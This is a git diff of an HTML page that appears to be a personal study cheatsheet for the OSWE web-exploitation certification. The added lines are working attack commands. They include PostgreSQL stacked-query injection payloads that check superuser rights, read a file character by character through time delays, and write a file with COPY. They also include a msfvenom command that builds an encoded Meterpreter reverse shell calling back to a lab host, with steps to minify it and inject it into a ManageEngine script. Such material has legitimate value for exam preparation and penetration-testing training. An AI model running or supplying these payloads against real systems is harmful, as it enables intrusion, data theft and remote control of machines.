@@ -4,7 +4,7 @@
 	
 	<title>OSWE personal cheatsheet</title>
 	
-	<meta name="description" content="General personal cheatsheet">
+	<meta name="description" content="OSWE personal cheatsheet">
 	
 	<meta name="author" content="Dane">
 
@@ -142,12 +142,21 @@
     [Postgres] Restrict quotes
         # use $$:   SELECT 'TEST'; = SELECT $$TEST$$; = SELECT $TAG$TEST$TAG$;
 </code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Enumerate SQL Injection
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Enumerate/Exploit SQL Injection
 [Postgres]
     # Check for DBA privilege:
         ;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
-    # Read file (time-based):
+    # Read file (time-based): Reading the first character of the fle C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.
         ;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
+    # Write file:
+        ;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+
+
+[Context: ManageEngine Applications Manager]
+    # Generate reverse shell
+        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
+    # Convert vbs into one-liner: (https://github.com/noraj/vbsmin)
+        vbsmin ./wmiget.vbs
+    # Inject to wmiget.vbs
 </code></pre></div></div>
 <hr>
 
